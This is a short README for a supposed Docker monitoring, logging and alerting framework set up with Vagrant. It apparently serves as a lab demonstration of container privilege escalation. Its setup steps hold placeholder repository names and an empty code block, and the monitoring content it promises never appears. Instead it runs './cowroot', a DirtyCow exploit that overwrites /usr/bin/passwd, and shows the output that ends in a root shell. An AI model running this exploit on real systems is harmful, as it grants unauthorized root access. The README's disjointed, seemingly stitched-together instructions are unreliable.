# Docker Monitoring Logging and Alerting (DMLA) Framework 

```
Prerequisites:
- git installed

```
 
# How to use

To make this as simple as possible most of the commands are automated which leaves the user to run only a few command. 

Firstly 
``
git clone xxxx && cd xxxx
``
Then run up the environment with the command
```
vagrant up
```
Once the server is built, we will ssh into it, either by vagrant ssh or vagrant putty. The latter uses the vagrant's putty plugin 
```
vagrant putty
```



```

The permissions have not changed. Now let's gain root access 
```
./cowroot
```
It will print the following 
```
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 54192
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
```

You will have root access to the container

Now exit the container with `exit` and `exit` again. Then remove it with `docker rm -f nginx`



# Clean Up

Exit back to your host machines terminal and issue `vagrant destroy`

